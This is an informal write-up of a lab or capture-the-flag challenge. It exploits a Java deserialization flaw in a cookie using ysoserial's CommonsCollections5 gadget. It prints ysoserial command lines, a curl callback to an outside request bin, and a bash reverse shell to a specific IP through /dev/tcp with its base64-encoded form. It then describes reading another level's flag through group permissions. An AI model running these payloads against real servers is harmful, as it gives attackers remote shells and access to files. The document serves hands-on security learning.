CommonCollections5 works!

- this is a java deserialization vuln, the item to deserialize is set as a cookie. Tried to decode with base64 and can see some java strings, then tried with SerializationDumper https://github.com/NickstaDB/SerializationDumper to see more info, but still no clear gadgets
- tried to inject custom serializations using yoserial first. tried with username (removing maxlength=40) but this bricked my siri setup (only returned "0"), oops. sorry
- then tried to replace the cookie with a yoserialization payload. Set up a requestbin and executed a curl command to the requestbin:

```
java -jar ysoserial-all.jar CommonsCollections1 "curl requestbinurl.com" | base64 -w0
```

- but no CURL request, nothing came in. Then tried with different versions of CommonsCollections, for 2 and 4 got the error "class not found" (so I am getting somewhere?) and for 5 I saw a request pop up in requestbin, nice
- tried to set up a reverse shell using a digitalocean VPS. Can't use piping directly (needed to redirect shell in- and outputs), so base64 encoded the following payload:
```
# start reverse shell to my VPS nc listener
bash -i >& /dev/tcp/104.248.91.239/999 0>&1
```
- converted this to base64 and then used yoserial with CommonsCollections5 to run
```
java -jar ysoserial-all.jar CommonsCollections5 "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMDQuMjQ4LjkxLjIzOS85OTkgMD4mMQo=}|{base64,-d}|{bash,-i}" | base64 -w0
```

- now I am in, can execute shell commands on the websec server. nice.
- looking around, the interesting stuff is probably in /var/websec, can access this dir but cannot list it. annoying"
- tried to look around for a bit, scan and bruteforce some dirs. I remember that there was a flag for social in "/var/websec/wwwstudent_12" can access this directory, nice!
    - but the same problem again. annoying. cannot list any files or folders
    - tried to use `find` to find files matching the "flag{}" pattern, but does not work if you cannot list dirs. tried to enter other students directories but cannot because I am not the right group
        - used `groups` to find out which group I actually am
            - am in group wwwchallenge_06, nice. that must be siri
            - took a look at the flag for social again. see that the flag was in level01, would /var/websec/wwwstudent_12/level06 work?
                - it does, really nice. Tried flag.txt and this time it worked



